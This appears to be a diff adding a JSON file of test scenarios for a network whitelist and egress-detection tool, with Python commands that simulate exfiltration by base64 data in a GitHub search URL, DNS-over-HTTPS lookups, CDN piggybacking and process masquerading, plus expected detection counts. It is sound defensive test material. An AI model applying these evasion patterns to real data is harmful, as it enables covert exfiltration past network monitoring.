@@ -1,0 +1,85 @@
+{
+  "version": "1.0",
+  "notes": "These scenarios are tuned for Ubuntu Lima local testing first. Promote to CI only after local stability criteria are met.",
+  "baseline": {
+    "warmup_seconds": 20,
+    "post_attack_wait_seconds": 15,
+    "whitelist_name": "github_ubuntu",
+    "create_whitelist_include_process_default": false
+  },
+  "scenarios": [
+    {
+      "id": "allowed_domain_exfil",
+      "description": "Simulate covert payload transfer over a likely approved GitHub domain/path.",
+      "command": "python3 - <<'PY'\nimport base64, requests\npayload = base64.urlsafe_b64encode(b'EDAMAME_ALLOWED_DOMAIN_EXFIL_SIMULATION').decode()\nurl = f'https://github.com/search?q={payload}&type=code'\nprint('request=', url)\nresp = requests.get(url, timeout=20)\nprint('status=', resp.status_code)\nPY",
+      "signal_process": "python3",
+      "learning_expected": {
+        "min_nonconforming": 0,
+        "min_anomalous": 0,
+        "min_recorded_sessions": 1
+      },
+      "enforcement_expected": {
+        "require_failure": false,
+        "min_nonconforming": 0,
+        "min_anomalous": 0,
+        "min_recorded_sessions": 1
+      },
+      "ci_ready": false
+    },
+    {
+      "id": "dns_over_https",
+      "description": "Use direct DNS-over-HTTPS requests to resolvers absent from the custom whitelist.",
+      "command": "python3 - <<'PY'\nimport requests\ntargets = [\n  'https://dns.google/resolve?name=example.com&type=A',\n  'https://cloudflare-dns.com/dns-query?name=example.com&type=A'\n]\nfor t in targets:\n  h = {'accept': 'application/dns-json'}\n  print('request=', t)\n  r = requests.get(t, headers=h, timeout=20)\n  print('status=', r.status_code)\nPY",
+      "signal_process": "python3",
+      "learning_expected": {
+        "min_nonconforming": 0,
+        "min_anomalous": 0,
+        "min_recorded_sessions": 1
+      },
+      "enforcement_expected": {
+        "require_failure": true,
+        "min_nonconforming": 1,
+        "min_anomalous": 0,
+        "min_recorded_sessions": 1
+      },
+      "ci_ready": true
+    },
+    {
+      "id": "cdn_piggyback",
+      "description": "Access payload over public CDN endpoint not present in baseline custom whitelist.",
+      "command": "python3 - <<'PY'\nimport requests\nurl = 'https://cdn.jsdelivr.net/gh/jquery/jquery@3.7.1/README.md'\nprint('request=', url)\nr = requests.get(url, timeout=20)\nprint('status=', r.status_code)\nprint('bytes=', len(r.text))\nPY",
+      "signal_process": "python3",
+      "learning_expected": {
+        "min_nonconforming": 0,
+        "min_anomalous": 0,
+        "min_recorded_sessions": 1
+      },
+      "enforcement_expected": {
+        "require_failure": true,
+        "min_nonconforming": 1,
+        "min_anomalous": 0,
+        "min_recorded_sessions": 1
+      },
+      "ci_ready": true
+    },
+    {
+      "id": "process_masquerade",
+      "description": "Same destination reached by different process identities to validate process-aware whitelist behavior.",
+      "command": "python3 - <<'PY'\nimport requests\nurl = 'https://pypi.org/pypi/requests/json'\nprint('masquerade_request=', url)\nr = requests.get(url, timeout=20)\nprint('status=', r.status_code)\nPY",
+      "signal_process": "python3",
+      "learning_expected": {
+        "min_nonconforming": 0,
+        "min_anomalous": 0,
+        "min_recorded_sessions": 1
+      },
+      "enforcement_expected": {
+        "require_failure": true,
+        "min_nonconforming": 1,
+        "min_anomalous": 0,
+        "min_recorded_sessions": 1
+      },
+      "ci_ready": true,
+      "requires_include_process": true
+    }
+  ]
+}
